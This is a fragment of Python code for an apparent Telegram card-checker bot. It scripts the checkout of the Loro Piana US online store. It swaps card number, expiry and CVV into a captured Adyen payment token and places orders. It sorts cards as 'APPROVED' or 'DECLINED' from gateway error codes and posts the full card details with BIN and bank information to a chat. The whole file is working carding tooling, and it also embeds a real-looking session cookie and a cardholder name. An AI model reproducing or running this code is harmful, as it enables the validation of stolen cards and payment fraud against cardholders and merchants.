        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'csrftoken': csrf,
        'origin': 'https://us.loropiana.com',
        'referer': 'https://us.loropiana.com/en/checkout/single-step-checkout',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = {
        'paymentMethodCode': 'adyen',
    }

                   

    response = session.post(
                'https://us.loropiana.com/en/api/checkout/select-payment-method',
                headers=headers,
                data=data,
    ).text


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Nineth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        'authority': 'us.loropiana.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        #'cookie': 'AKA_A2=A; bm_sz=22A8F7207CCF15CDF883F5FE3241E41C~YAAQCHs1F3Q+pmKNAQAAbF4vehZvXWcKLli1rC+HyUTTJU8Crl46+ueyXmzrEK1dqanuCozUnW+uaGS3c3MSTV+Y/4qEVektA8XjmwGHaDc1DaiC4uMpihiKIQ4or6+XvVuCmgQ3DLk6oKVsUL/+7EhhRci8qIHm9341bbUofSOSgL7RqSEfBLWH62ZIx/++/CxZpDdWK6g8Wtgh3fkWl9tbEt7z9WyoHusEx0G9iG3fhC4NhTuUwmHOQye7OqMO7PnRkPzKxZx2cClZimAth56+k9E44+zF12+jz7uy06qTFFYKvLWnj3+l4j/0zzk0ligNzXmH96kr/J191yQvde+fZPujWWtwLUYRjs8TlnVhRf7sgjSC/ndw~4403779~4602167; bm_mi=5F95AE8C2C40B94CF37E6A5CA9FFB6B8~YAAQCHs1F3s+pmKNAQAAn14vehaKls0a7tn8mZ79XCxNr4iBsOCO0Zvmu14wNW09JmbK9AAuBZA1+lO9J9V4dk+dcejRH7IBE4wZLUkij9YpDSj8aTCoaZ3RSRwzvWpCqCjatLnbpUB+4/voqmSwo0eNhg2jYYjwa21yNHQlCfKs3xicho+jTZJaAzEPseR7rROM0Rq8f38lXMTvT7Pix7Do0M/TEmrplOy14yuFSAaPcUOpoVoaQg6vWX2IdXK9llhZYogfRuq5Yy+ZMiwfSyJQyju491yCnx6SDh9bTNkC5+Fp7Hmp+qjSbFuYwb5TL86hIw==~1; _abck=9503C058AC6F925328C0D826E6C3BD61~0~YAAQCHs1FxVBpmKNAQAAT2wveguJsBaDVBbtgBAYZ7fDRKBoIUwkSCUKBiGT1I7dqiaFZIR7zo684DpgiaatJvpV0GSsJpjfLivpUDzO8gJ2Ekv7RjdBSuIdZJmh4FxdatxR/nsq62UXTFzPNnhAoQpWlyce6Mp6wEOrx3bDSLXAQzxF80el7FzlZ8hy5RQPWC89ULRrXRu2NPf6mpSfYwqPGGOtMSIC7KGYFUyHFGEkNIFvFrSssmF7yNFpnBUD1uJ/ob8W27TZ2mRG0FnjGVuoyAHvpwsSMLyp2sLk9Tm4XK/gxvnD783skyEkMnR37sPyq5Xb7QRx9WgDfmhnk/zghIt7v4FZcK9ZsrI0u98ZDT/nlhPRtLa5aHfXE7xpT320DmYGWyMSVLHwQl+aA69BpJHg/pG5Wut4Ig==~-1~-1~-1; preferredSite="https://us.loropiana.com"; anonymous-consents=%5B%5D; cookie-notification=NOT_ACCEPTED; B2C_JSESSIONID=Y2-c47c63d0-7e78-454a-86b1-9d3f808b6081; loropianaSite=loropianaus; ak_bmsc=17B30602F262F8285A5E5F1E900C2996~000000000000000000000000000000~YAAQCHs1F1dCpmKNAQAA6XMvehYDNTjHhD1JU+DtD9yjuZDJiKD0rqL/QWc+BhLvo/nwm+OqupbFmgHkDPFRf4TCbaHN4YQHzWjKc5N4ZaBrrwThmiMPsh5ntNXK+gQ3RN3G1JcLO6e5LLSzzcH5Z8WPels7+JLDxAGWkmb/ynPwLvCd4qwot9t7lIaS7WECjSw4pzyl8xbffbDlMbH9sjB7PSD01x3Ycit/9Qh/0pSLx54zlrD3lHnVbHB0zxWCqUGqETMM7oxsnxsE93oTn8S8wQ0HbxdY3uqjMzqGsAuUMGH4ALYXWd2GVRVxdeJ48NXb3LWPRMFgwUTdowiNmvPA4LQh9jIW86vHGa2gGpPx1bXWHS9lC3KYYxfNe5mP0ZN9gLt8vyZVCWhZHIml9WbvlFFQWgRh/PXAXQ1bFUsdcDM2yb5w+9/L0Kc9ENpdZwkfI/Y0wBYbKemykmNGPOpFvnVU9DMLij1UIZtcXXXjSJlmX5UTrCqWeVRKwNWSY59VbxGI4IkIzqomlqw7vLCLOzr2NjaDpYI=; _ALGOLIA=anonymous-c9c1ee56-66a6-417d-ac3a-50df3998f637; _pk_id.www-loropiana-com.6421=08ff36dc51abb503.1707151947.; _pk_ses.www-loropiana-com.6421=1; _gcl_au=1.1.1677157124.1707151951; _cs_mk_ga=0.06377189096173241_1707151951342; cookieConsentOneTrust=1&2&3&4; _gid=GA1.2.1498419964.1707151954; _cs_c=0; FPID=FPID2.2.EzkaHVmHwu23uWiPZdDkH23hqenrlxbjrv7M25xO2Ts%3D.1707151948; FPLC=qv2owIQ%2B8MRKztO4cmR9d5l8BzKj%2BO%2BMSbn6fBSZ%2FNgyx9gzeGgnz2aczwKng2hLiAsMm43f881QhBzMrt4orb4QxzoN1bzHJLxUVdQcIQtBxo%2Fz%2FiYK%2BIuGpMCXhQ%3D%3D; _pin_unauth=dWlkPU9UVmxZek5sWkdZdE1tWmpNaTAwTVRJeExXSXpaV0l0TlRZeU0ySXlZVFUzTWpVNQ; _fbp=fb.1.1707151957120.1862613803; OptanonAlertBoxClosed=2024-02-05T16:53:27.349Z; _dyid=-6606779698162625976; _dyjsession=31875bdc4d09d4b8ca47ac164f2b54a9; _dy_csc_ses=t; dy_fs_page=us.loropiana.com%2Fen; _dy_df_geo=Germany..; _dy_geo=DE.EU.DE_.DE__; _dycnst=dg; _dycst=dk.w.c.ss.fst.; _dyid_server=-6606779698162625976; _dy_c_exps=; _dy_c_att_exps=; _dy_cs_gcg=Dynamic%20Yield%20Experiences; _dy_cs_cookie_items=_dy_cs_gcg; categoryLastVisited=L2_MEN_ACCESSORIES; anonymous-wishlist=e56da1b7-db28-472b-9123-292ed087d1b9; FAI8452_8000=category%20page; pdpLastVisited=FAI8452_8000%2CFAM5891_MB97; loropianaEU-cart=e848d59e-fccc-45be-94d2-e2698a5cf33b; loropianaJP-cart=7d88df3a-d256-49c8-a517-8b680ae12b90; loropianaUS-cart=616f4e15-1b73-41e8-a228-cf29e592db4a; loropianaKR-cart=f2ebf046-855e-4d3a-8a1c-482c6e81ee11; loropianaCA-cart=f150cbc7-3ea3-443c-9562-9a8aae485d8c; loropianaUK-cart=cf7f539f-933b-40ba-8ac7-1683480a3b7b; loropianaHK-cart=320eb1e5-75ea-45f3-91de-b817695d7a8d; _dy_soct=1159806.1451389.1707152031*1215367.1691635.1707152294; FAM5891_MB97=product_detail_page; FAM5891_MB97_L=product_detail_page; loropianaUAE-cart=f1063676-4024-4533-aebb-4bfd019e1096; _dy_ses_load_seq=14767%3A1707152407571; _uetsid=f5caf410c44611ee80536135e1effcdd; _uetvid=f5cb2f00c44611eea5104f946fb33909; _ga_JX1QGE1J9P=GS1.1.1707151953.1.1.1707152411.0.0.0; forterToken=cb3bc781e062453589e13526d3369929_1707152407981__UDF43-m4_15ck_; _dy_lu_ses=31875bdc4d09d4b8ca47ac164f2b54a9%3A1707152415466; _dy_toffset=-6; OptanonConsent=isGpcEnabled=0&datestamp=Mon+Feb+05+2024+17%3A00%3A17+GMT%2B0000+(Coordinated+Universal+Time)&version=202312.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=eb03a594-d6cb-4eab-bc81-67964d88ee7b&interactionCount=1&landingPath=NotLandingPage&groups=C0003%3A1%2CC0001%3A1%2CC0005%3A1%2CC0004%3A1%2CBG1742%3A1%2CC0002%3A1%2CSSPD_BG%3A1&geolocation=DE%3B&AwaitingReconsent=false; inside-eu4=439993505-d6b88da906d3c1e8e02ef27174ccad882c33377436d549fd95110bb64c94c317-0-0; _ga=GA1.2.1012676151.1707151948; RT="z=1&dm=us.loropiana.com&si=b5316791-d8f3-4d34-aecb-7d12a9c2b276&ss=ls966rti&sl=12&tt=5m46&bcn=%2F%2F17de4c14.akstat.io%2F&ld=aa0l"; cto_bundle=PwJU_l95VVJncmQ4OVcxRTdYbzdJOFRBWVFOQ2RJQ1pSNW5GV0ttOThCc001Rzd2c1d0ckNldnhWRHp4WkFmcFNERkpwc0F3bEdSRG1yJTJGODFYczA4b0paWFRHNXJDc3JJeGdNOVVCbE14U0lsVWlobW5zRFFlVyUyQjJpdHM5QlZIUk5GQTVHSGolMkYlMkZDams4eUpDd1R1bnJsNlBoQSUzRCUzRA; acceleratorSecureGUID=a4cf52f70f981f9f98884284cfb0dcafb40ae5c3; _dc_gtm_UA-20296299-10=1; _cs_id=81b7d7ae-5b6d-a25b-c59f-e2c1b2615b8e.1707151954.1.1707152623.1707151954.1.1741315954716.1; _cs_s=19.5.0.1707154423744; bm_sv=C00F1E620F0EEADACE8612CB6CBB9530~YAAQCHs1FyNMqGKNAQAA0Ek6ehb0qPaY+76OdI1WExa3VCTInlfewF6LdeApbmmjm6LiQVMQSIC8IuDR8MN6tk/zVQA/u+iAICD7Qqgkt8ZcRSchNprITJPMu+VKtXKG4nb+BP3Aj9UfQOoZvgzppzzbju9YlqJJ2eJYfIyy8Tv86EAxb35ktNXKpAUEWORD16ZsbqWQf8qp8wYQxBhm/8UdCrHMm6BrqUf6TIyMdhm+yXQq33LNHg8/0aU4p5lR4S/cGIk=~1; _ga_8NP3BVTBV0=GS1.1.1707151948.1.1.1707152656.0.0.0',
        'csrftoken': csrf,
        'origin': 'https://us.loropiana.com',
        'referer': 'https://us.loropiana.com/en/checkout/single-step-checkout',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    data = {
        'termsCheck': 'true',
        'threeDSecureJsonToString': '{"deviceBrowserTimeZoneOffSetMinutes":0,"deviceBrowserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0","browserJavaEnabled":false,"browserLocale":"en-US","browserColorDepth":24,"browserScreenWidth":1366,"browserScreenHeight":768}',
        'invoiceFiscalCode': '',
        'customerNeedInvoice': 'false',
        'adyenTokenJson': '{"data":{"riskData":{"clientData":"eyJ2ZXJzaW9uIjoiMS4wLjAiLCJkZXZpY2VGaW5nZXJwcmludCI6IkRwcXdVNHpFZE4wMDUwMDAwMDAwMDAwMDAwOXkzdE9SbGUyUTAwMjU1Mzc4MDBjVkI5NGlLekJHcUlkNzBJdkV1TkJpeDdSWDNhejgwMDJDQ3Q5cWlRR0NjMDAwMDBxWmtURTAwMDAwSHhaMmZZNHUwN0VDNEZsU0FCbVE6NDAiLCJwZXJzaXN0ZW50Q29va2llIjpbXSwiY29tcG9uZW50cyI6eyJ1c2VyQWdlbnQiOiIzMTZmZTVjYTA0NjMxZDkyOThlZDc4NzE0ZTU1NjY4NSIsIndlYmRyaXZlciI6MCwibGFuZ3VhZ2UiOiJlbi1VUyIsImNvbG9yRGVwdGgiOjI0LCJkZXZpY2VNZW1vcnkiOjQsInBpeGVsUmF0aW8iOjEsImhhcmR3YXJlQ29uY3VycmVuY3kiOjIsInNjcmVlbldpZHRoIjo3NjgsInNjcmVlbkhlaWdodCI6MTM2NiwiYXZhaWxhYmxlU2NyZWVuV2lkdGgiOjcyOCwiYXZhaWxhYmxlU2NyZWVuSGVpZ2h0IjoxMzY2LCJ0aW1lem9uZU9mZnNldCI6MCwidGltZXpvbmUiOiJVVEMiLCJzZXNzaW9uU3RvcmFnZSI6MSwibG9jYWxTdG9yYWdlIjoxLCJpbmRleGVkRGIiOjEsImFkZEJlaGF2aW9yIjowLCJvcGVuRGF0YWJhc2UiOjAsInBsYXRmb3JtIjoiV2luMzIiLCJwbHVnaW5zIjoiMjljZjcxZTNkODFkNzRkNDNhNWIwZWI3OTQwNWJhODciLCJjYW52YXMiOiI0NGMwNDA5MGU2MzI3ZWQ1MTBlOWNmZjUxODkyNDlmNSIsIndlYmdsIjoiM2Y5MjQ3MTQyZjZiOTZjMmQyYzYzMTYwNDI5YzBjYzkiLCJ3ZWJnbFZlbmRvckFuZFJlbmRlcmVyIjoiR29vZ2xlIEluYy4gKEdvb2dsZSl+QU5HTEUgKEdvb2dsZSwgVnVsa2FuIDEuMy4wIChTd2lmdFNoYWRlciBEZXZpY2UgKFN1Ynplcm8pICgweDAwMDBDMERFKSksIFN3aWZ0U2hhZGVyIGRyaXZlcikiLCJhZEJsb2NrIjowLCJoYXNMaWVkTGFuZ3VhZ2VzIjowLCJoYXNMaWVkUmVzb2x1dGlvbiI6MCwiaGFzTGllZE9zIjowLCJoYXNMaWVkQnJvd3NlciI6MCwiZm9udHMiOiJiYzA4ZTExZjczNzIxYmQ1MzM3MmJkMzc0ODNkNDU4OSIsImF1ZGlvIjoiOTAyZjBmZTk4NzE5Yjc3OWVhMzdmMjc1MjhkZmIwYWEiLCJlbnVtZXJhdGVEZXZpY2VzIjoiMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAifX0="},"paymentMethod":{"type":"scheme","holderName":"Andres Bermudez","encryptedCardNumber":"adyenjs_0_1_25$P4+HjNAVvBV/BDK6rDB0JHfMZp33cI2juKskhZuzz0MamcSG9xZfb/5Q78HulgqEfBRJWbou/n8ED2BVzVIckXRYha5NpRW0LQs+8waPFciP+VAYJc74+NSvRGTAMxuREDNM3/25TppWmAeeGCcjzR8z4hTyJuavWBbXcUJxlLR0l482EtNVz+QoqwFBA3YeBAx3jFT+gmVSXaW6vN6Ylb2Yi3WczYG1kHz7Im7ihVhzVBfjCCEMkkrTwyH6D3PX4qY+DJzgDN56D4lNlAlCBVZu9MawWydHoNyRT+4q3Cp+OSFvzYYoDsq9hlZp/nG7T411XajixQXK+VNlvY6nLQ==$PdA/tmupkJuDj/O6l3gZ1c9YDNJImWN547mCgZUYp5NAp2hbdqvRkbQ+4xCH5ls/uxAT4aWjd+IVo8TMQJhymbi3k3vbKpu8oYcOEWYUB4irDMN/8EjiLOamwvuly3Vmhcgnizp+Xx+WEeAzDBpzfTpagd0asVQDsN6TqIlazGOxD5FItjCM4HgXsvdZJRt+bQBvmwfp1860u6Zjztg9xuKLYPMkvR/O1HEnla95Owi7xrX3byE2OhGH9OzZ7chV7qPOz/Uj1qhKpvaDrOyGp+D6wZcJH5VCH4Mt/KiObNowYvd4TOngGnSPfzog+w66jzpv7az4TE2oeuJbMscg6DBUKFpmuxFk6nZfYVnPsnNC5lx35Lmw+30ImXJUKdjR485t04pgMHaTDiz0dz0sBNLdlxpTIuHv2O3zdGPtp6CMz0Hwggw6TVtZbQaEe50XCWvrkQXiIbn97egJrrIWtK1NkdOpjhJNvYfydo4YJHuVJu4oMzeG6QmJngfgLr9MbdH/q5freoncj7xBxxmUMJRmSMm9JxdXmNiNg7klFSLVKI6NPDpsWskrR2p3xEdJMezHIrydjqDQV7/fFpMQfZh43Gd7olK0ofgxXhLr7MonHU02TIViu06nSdIB0pbCTX3ptMCby7Um9g4lM/7wWxMt611FG9M4Mi1hwNy6c1YbxQBrFHPn68Mz8AT2kUqGKKNisyT9OZFA4vkRHnW5apYmr5Q3D0fuAjhE1jZvf14V+8JM1VLSaw4A0qz/E4XeeNlzqZgftzY0e+zVrR+oZZAl8/fwF+ojyN9MCgJrhinbXMC4r874PY8VCX0b8VYvEVFSTs9EaZY/4od76Y69Hf9KYM4JkpZN57pJBUaaYDOSltBwM7Wd8LfQovyFJZfhI9e59H/CjW9hoR03ebEF028Bf6JQc10yt71j9ypXCiEIqBrmonSxYfQN8MTL4+wISNgo1MyP93X0gZPBU9Q=","encryptedExpiryMonth":"adyenjs_0_1_25$UGysRnczQqTG8XKuPoJpE5+8qVTPXzQsBXUPeEO7WptHdtuyZYK1gvz72j1K6em0OQaPop3HL+C0yNXw+8YEjhyk1loTCgAzyBpIxTHQhVLQqcyHZTmjAGpfWLMBdV7kYwfRF5LcPLVEdf97QqeJ46yjS3QVVZh+6YoZiOCM+cimFpSbUsInrkd0qXpg3jALF5wTj/MYNVO6O3eXv2rqeuenYW7k6RSjBn41PzwYssPiYMECXVaMOmofgnkeFSgtmBJuLB9Dz8H9cL5X0HK4K1fD2Nh5+nVgpD3FSt9PuJ9G3IPuwTx2y0odM67jGxlCU0scfnJb5bQ65q2DHJ6riA==$zhe7gf7iDU1pPYr85itOwjY52G3HBTTkU8XAaIcHZhpkOS26tNjDJTytI6178Ce2TqD49EoRhV1Um6QlLoWlusbZgSLhbaQEv1/uzSKqehGT+24/HY0yMZQ6gBIB6Q13gGVzjedPvEIXYTMmxgBr+xxTJLRaLoarjcyUZHLWsTi6cG9MpvrgWPA/HqiMTNTw/xBvNES0e6ha4qaR2/82xevJNMRGhsifm2bvGuC5UocHJoq5wmAAbDU8ZeDN3bCyrAWickHcHf+e/SsPuFrR8Nzgr9HkQ1R3e8R4mX5L8tuXgqhHmwpsFe+D2q5OoNJoMVwNS+YpO8ZRG8GUBKObzvkXGvieBdABuMyQRLVRPwfzFclJqMr/ZcID9KApguDPor7GGHGpdNjP5btVuxaq2dWJM6WBCHGw7qoMigU5vpybQbSrfYPztMXAymZ2qTvIbVoEfTIIa8I=","encryptedExpiryYear":"adyenjs_0_1_25$FGHl+2qZeWPBMJjT3Ev4Zy8LOZ5WgNJjhs2De7AfwzP3GaO7N8xZXOBw0u/ieBVFY+lMqEPex9bKhQcoO+XJvfNNYjOIL8yD9oaEiOUNXscdeb1hETVevz9g5+Nu8ozdEPDmJaMjWlDYyinWklBWP4GwD7cakCCQymKmio5uV/FgMbpoFn5lRoh9nzEW49KJmYe0ybHIL5+pfzgzWSNC3fl2GTQ5PExign+UNiogZzkOUg6tqIUjmELNhUZW0Y8AwRRXmr60DS5Q9SsdBy+cmVJ53zqUol+7HHgjJ3jJUp7jEl1tQr80BXdr2in59yXgF4fgnpwp9YpS0bzVd2O7jw==$kQ3MzXGXDcJ0PojtJ5lf0frrEjsYkx9hKQ8UBXgidqJdQfKs27s1fXiV7yEjqZk1X2Sb/B1bllBWBhhu8XClt9azfRq/noO0QCpJy7mql0UWp35jke1rzFygQEz60/ndOvay/mHAFvsWivba8RV4Y9tMTHbeqKMhfkX5TnwdZC6PmZkg6nL5NuEddo2jOb2mjTBAOeVIfdccvHgKQVfed07i5PM9ASUR+VnLr15dAw5CRuhpKe8N/ecpJooJ0LhkLvXpIxrZv0iXzHEHgZNUOrOExo3oh7yPZ17nLsBJ3zvtII8kXGZFXH2bhYZmcXLY5CvYRGl5MkWG9Eb2o1SKgGwjGruZUGa18m4YAAP4g+hN7yxxpRs93MBMAJVe8uEJs0ytyPnghQwT3h6beaQrDl39/Y1Vfl6JaTKs+8UaFZg67kY+fzie9QGs0NocLkemAQBJbJrGY0bH","encryptedSecurityCode":"adyenjs_0_1_25$aqzcaZ+8A17TxksoISLRHpUb7Sx56ZFG2h4lXzlgg8S2H7KVaefSet3atTqneodP2y9XbquocHFJyL2/nsbo9ZOkmz/fP244sLD90c7CULsJZUg4KI2Fp6c5Fi7YFRcdP14EfnzInMl6zfNJK3V9xwzvRn9W8XhpBHQuE5JK0pn3CTm66HwgpcuLE5kHEbVr2mQN4TzLwoZbOd4P2zmOohaE/6WKCwt6DRGcdIaC/qrmBw7GF+3uK2qud12UW/q90ORicX/h7KDhHmwttjf+lkeweoUHG1puVPfapT/Y1nq7aAh85T1qgWl1PazK7YYK2WOLn58EyCTeFT/zi6EiBw==$Qrg6czF6QzgwQukrEFmM9XGs/Qn6QBL9ZdgrRnXWCyJBxyh/FeeAM9tnF/Yd/AJsqLrVn0fzXx2CVwsIW45y+RXQyEnKD7OAeZqynQklOEwwJ2vT06NziFZ9Zh4nU+FcqMEhI6TnrSJSKhUKEUoZkyvC5KG/4V8RFBIhi1zEq4JJfcAMf+peCJyzzQpNvPJeFzhFho4OsGlNTZcN/SV6Z4RPYXOZm9co7aYKdAvcrbSWFcwEOG66nUaS3Cj9KIzJMaHQM5nhyOKoLzdKiBwO4U4ucinCKkwlrtWLKUrD9DuqIGMVdYW6cTuBDFFjhlrP6Qjz1ahfYX75VBaO0h6jpe1pseqQpIq1/CnVjRRezbEoo4JyWYU5VokrdPBNZ4J6DL+p4y6gja1jc2BtcKANi/myyAX/folohQTEVGFqLWhesSXp6eXbBjOdaurgwF/QVHwx7Ou6RFkKqbUduPi/EfqPTuaCoXKYt24nwDbTSMangmXSrbUhs9uyZPJtjrvNZfWcNIjH+7YjtD3QjzSEsk/X9xhGePV+2Uw+bol+jxLqnqd2fsHXyFvak0DiPw0U8T8WV+0SSAYl5jDx97LefRhi9HzIQYwtLnO2J6LL3XwyAg5dZXM7Fd/Pt8dqqvu2stAEfBtvi4Fke7IAKYLDnzZZiFwxTnQ9P1A75FosUa2MfLgdwIB1GqQkdpiuGp3rFtyG85RAtrOSado8MeMyArkTEaZMEA41ZNuR+zbc5/wOAR/atWBTD5x1qx/UmRattv/qxomzd3i489p6oRONY5pxHA==","brand":"mc"},"browserInfo":{"acceptHeader":"*/*","colorDepth":24,"language":"en-US","javaEnabled":false,"screenHeight":768,"screenWidth":1366,"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0","timeZoneOffset":0},"clientStateDataIndicator":true},"isValid":true}',
    }
    
    data['adyenTokenJson'] = data['adyenTokenJson'].replace('"encryptedCardNumber":"{}"'.format(data['adyenTokenJson'].split('"encryptedCardNumber":"')[1].split('"')[0]), '"encryptedCardNumber":"{}"'.format(AdyenCCnum))
    data['adyenTokenJson'] = data['adyenTokenJson'].replace('"encryptedExpiryMonth":"{}"'.format(data['adyenTokenJson'].split('"encryptedExpiryMonth":"')[1].split('"')[0]), '"encryptedExpiryMonth":"{}"'.format(Adyenmes))
    data['adyenTokenJson'] = data['adyenTokenJson'].replace('"encryptedExpiryYear":"{}"'.format(data['adyenTokenJson'].split('"encryptedExpiryYear":"')[1].split('"')[0]), '"encryptedExpiryYear":"{}"'.format(Adyenano))
    data['adyenTokenJson'] = data['adyenTokenJson'].replace('"encryptedSecurityCode":"{}"'.format(data['adyenTokenJson'].split('"encryptedSecurityCode":"')[1].split('"')[0]), '"encryptedSecurityCode":"{}"'.format(Adyencvv))
    data['adyenTokenJson'] = data['adyenTokenJson'].replace('"brand":"{}"'.format(data['adyenTokenJson'].split('"brand":"')[1].split('"')[0]), '"brand":"{}"'.format(brand))

                   
    response = session.post('https://us.loropiana.com/en/api/checkout/place-order', headers=headers, data=data).text
    
    redirect = makeGate.getStr(response, '"redirectUrl":"', '"')
    

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Tenth request ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    headers = {
        'authority': 'us.loropiana.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'sec-ch-ua': '"Not A(Brand";v="99", "Microsoft Edge";v="121", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

                   
    response = session.get(redirect, headers=headers)
    
    resp = response.text
    url_ = response.url
            
    pattern = re.compile(r'https://us.loropiana.com/en/checkout/adyen-confirm/(\d+)')
    match = pattern.match(url_)
            
    code = makeGate.getStr(resp, '<div id="js-checkout-vue-entry" data-user-logged="false" data-delivery-addresses-user="1" data-error="', '"></div>')


    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[ Response Code ]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━


    if "payment-failed-24" in code:
        msgx = "APPROVED CCN✅"
        respuesta = "CVC Declined."
            

    elif match:
        msgx = "APPROVED ✅"
        respuesta = "Charge $5"
                 
        
    elif "payment-failed-12" in code:
        msg = "APPROVED CVV✅"
        respuesta = "Not enough balance."
        
    elif "payment-failed-32" in code:
        msgx = "APPROVED AVS✅"
        respuesta = "AVS Declined."
    
    elif "payment-failed-11" in code:
        msgx = "APPROVED 3D✅"
        respuesta = "3D Not Authenticated."        
        
        
    elif "payment-failed-0" in code:
        msgx = "APPROVED 3D✅"
        respuesta = "Authentication 3D-secure failed."  
                
    elif "payment-failed-8" in code:
        msgx = "DECLINED ❌"
        respuesta = "Invalid Card Number."  
               
        
    else:
        msgx = "DECLINED ❌"
        respuesta = code


    data = r.get(BIN_API+BIN).json()
    final_time = time.time() - initial_time

    card_response = f"""<b>#{name_gate} (${command}) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccnum}:{mes}:{ano}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {msgx}<b> 
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {respuesta}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['brand']}</code> - <code>{data['type']}</code> - <code>{data['level']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['bank']}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data['country_name']} {data['country_flag']}</code>
s<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
    await msg.edit_text(card_response, parse_mode=ParseMode.HTML, disable_web_page_preview=True)